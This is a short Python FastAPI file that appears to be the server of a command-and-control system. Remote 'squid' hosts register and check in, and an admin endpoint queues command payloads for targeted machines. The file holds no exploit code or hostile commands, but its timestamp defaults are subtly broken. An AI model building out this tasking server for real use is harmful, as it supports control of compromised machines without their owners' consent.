from fastapi import FastAPI
from pydantic import BaseModel
from mdc import get_database, insert_document
import time

class Squid(BaseModel):
    id: str
    group: str
    hostname: str
    mac: int
    timestamp: float = time.time()

    def to_mongo(self):
        return {"_id": self.id, "group": self.group, "hostname": self.hostname, "mac": self.mac, "timestamp": self.timestamp}


class Call(BaseModel):
    squid_id: str
    qcommand_id: str
    result: str
    timestamp: float = time.time()

# curl -Uri http://127.0.0.1:8000/admin/qcommand -Method POST -Body $post -ContentType 'application/json'

class Qcommand(BaseModel):
    target_id: str
    module_id: int
    payload: str
    created: float = time.time()
    status: str = "QUEUED"
    # status = [QUEUED, ISSUED, FAILED, COMPLETED]


app = FastAPI()


@app.get("/")
async def root():
    return {"message": "MOTHERSHIP"}


@app.post("/squids/home/")
def squids_checkin(call: Call):
    response = insert_document("calls", vars(call))
    return {"message": response}


@app.post("/squids/register/")
def squids_registration(squid: Squid):
    response = insert_document("squids", squid.to_mongo())
    return {"message": response}


@app.post("/admin/qcommand")
def admin_qcommand(qcommand: Qcommand):
    response = insert_document("qcommands", vars(qcommand))
    return {"message": response}